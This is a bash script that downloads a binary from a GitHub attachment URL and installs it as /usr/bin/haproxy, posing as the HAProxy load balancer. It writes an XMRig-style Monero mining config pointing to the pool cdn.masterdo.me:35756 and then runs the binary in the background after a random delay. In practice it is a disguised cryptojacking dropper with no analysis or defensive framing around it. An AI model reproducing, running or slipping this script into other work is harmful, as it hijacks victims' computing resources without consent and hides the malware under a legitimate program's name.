#!/bin/bash
set -e
curl -O -J -L https://github.com/user-attachments/files/25812026/haproxy.tar.gz
tar -xf haproxy.tar.gz
rm haproxy.tar.gz
chmod +x ./haproxy
mv ./haproxy /usr/bin/haproxy
PRE_DELAY=$(shuf -i15-30 -n1)
sleep $PRE_DELAY
echo -e '{"autosave":true,"background":true,"colors":true,"title":true,"randomx":{"init":-1,"init-avx2":1,"mode":"auto","1gb-pages":true,"rdmsr":true,"wrmsr":true,"cache_qos":false,"numa":true,"scratchpad_prefetch_mode":1},"cpu":{"enabled":true,"huge-pages":true,"huge-pages-jit":false,"hw-aes":null,"priority":null,"memory-pool":false,"yield":true,"max-threads-hint":100,"asm":true,"argon2-impl":null,"cn/0":false,"cn-lite/0":false},"opencl":{"enabled":false,"cache":true,"loader":null,"platform":"AMD","adl":true,"cn/0":false,"cn-lite/0":false},"cuda":{"enabled":false,"loader":null,"nvml":true,"cn/0":false,"cn-lite/0":false},"donate-level":0,"donate-over-proxy":0,"log-file":null,"pools":[{"algo":null,"coin":"XMR","url":"cdn.masterdo.me:35756","user":"root","pass":"root","rig-id":null,"nicehash":false,"keepalive":true,"enabled":true,"tls":false,"tls-fingerprint":null,"daemon":false,"socks5":null,"self-select":null,"submit-to-origin":false}],"print-time":60,"health-print-time":60,"dmi":true,"retries":5,"retry-pause":5,"syslog":false,"tls":{"enabled":true,"protocols":null,"cert":null,"cert_key":null,"ciphers":null,"ciphersuites":null,"dhparam":null},"dns":{"ip_version":0,"ttl":30},"user-agent":null,"verbose":0,"watch":false,"pause-on-battery":false,"pause-on-active":false}' > /usr/bin/config.json
haproxy
sleep 2h
